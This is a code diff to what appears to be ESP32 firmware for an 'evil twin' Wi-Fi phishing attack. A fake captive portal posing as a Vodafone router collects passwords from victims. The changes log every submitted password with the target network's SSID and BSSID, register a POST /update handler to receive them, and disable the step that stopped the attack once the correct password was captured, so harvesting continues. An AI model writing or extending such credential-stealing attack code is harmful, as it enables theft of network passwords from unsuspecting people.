@@ -20,6 +20,7 @@
 
 #include "server.h"
 #include "evil_twin.h"
+#include "passwordMng.h"
 
 #include "web/web_page.h"
 #include "web/web_net_manager.h"
@@ -36,10 +37,10 @@
 #include "web/firmware_upgrade/index.h"
 
 #define CHUNK_SIZE 512
+#define CAPTIVE_PORTAL_URL "http://192.168.4.1/index.html"
 
-static const char *TAG = "HTTPD";	//TAG for debug
+static const char *TAG = "HTTPD";
 static const char *host = "vodafone.station";
-static const char *captive_portal_url = "http://192.168.4.1/index.html";
 static httpd_handle_t server = NULL;
 static target_info_t target = { 0 };
 
@@ -153,7 +154,7 @@ static void firmware_upgrade_index_manager(httpd_req_t *req)
  * 
  * @param req 
  */
-static void save_password_manager(httpd_req_t *req)
+static esp_err_t save_password_manager(httpd_req_t *req)
 {
 	char buffer[256];
     int ret;
@@ -169,20 +170,29 @@ static void save_password_manager(httpd_req_t *req)
 	char password[64] = {0};
     sscanf(buffer, "password=%63[^&]", password);
 
+	/* Save password */
+	memset(&buffer, 0, sizeof(buffer));
+	snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", (char *)&target.ssid, target.bssid[0], target.bssid[1], target.bssid[2], target.bssid[3], target.bssid[4], target.bssid[5], password);
+	password_manager_save(buffer);
+
 	/* Check password and send response */
 	if( evil_twin_check_password(password) != ESP_OK )
 	{
 		httpd_resp_send(req, "bad", HTTPD_RESP_USE_STRLEN);
 		httpd_resp_send(req, NULL, 0);
-		return;
 	}
-	
-	/* Save password and stop attack */
-	evil_twin_stop_attack();
+	else
+	{
+		httpd_resp_send(req, "ok", HTTPD_RESP_USE_STRLEN);
+		httpd_resp_send(req, NULL, 0);
 
-	/* Enter in deep sleep to preserve battery power */
-	/* Only hardware wakeup (Reset button) */
-	esp_deep_sleep_start();
+		/* Stop attack */
+		//evil_twin_stop_attack();
+		/* Enter in deep sleep to preserve battery power */
+		/* Only hardware wakeup (Reset button) */
+		//esp_deep_sleep_start();
+	}
+	return ESP_OK;
 }
 
 
@@ -216,11 +226,6 @@ static void captive_portal_redirect(httpd_req_t *req)
 		}
 		return;
 	}
-	/* Save password (keep it the same for alla attacks)*/
-	else if( strcmp(req->uri, "/update") == 0 )
-	{
-		save_password_manager(req);
-	}
 	/* loader.html same for all */
 	else if( strcmp(req->uri, "/loader.html") == 0 )
 	{
@@ -246,7 +251,7 @@ static void captive_portal_redirect(httpd_req_t *req)
 	{
 		httpd_resp_set_status(req, "302 Found");
 		httpd_resp_set_hdr(req, "Host", host);
-		httpd_resp_set_hdr(req, "Location", captive_portal_url);
+		httpd_resp_set_hdr(req, "Location", CAPTIVE_PORTAL_URL);
 		httpd_resp_send(req, NULL, 0);
 		return;
 	}
@@ -285,7 +290,6 @@ static esp_err_t redirect_handler(httpd_req_t *req)
     }
 
 	captive_portal_redirect(req);
-
     return ESP_OK;
 }
 
@@ -320,6 +324,14 @@ void http_attack_server_start(target_info_t *_target_info)
             .user_ctx = NULL
         };
         httpd_register_uri_handler(server, &redirect_uri);
+
+		httpd_uri_t update_uri = {
+            .uri = "/update",
+            .method = HTTP_POST,
+            .handler = save_password_manager,
+            .user_ctx = NULL
+        };
+        httpd_register_uri_handler(server, &update_uri);
     }
 	else
 	{
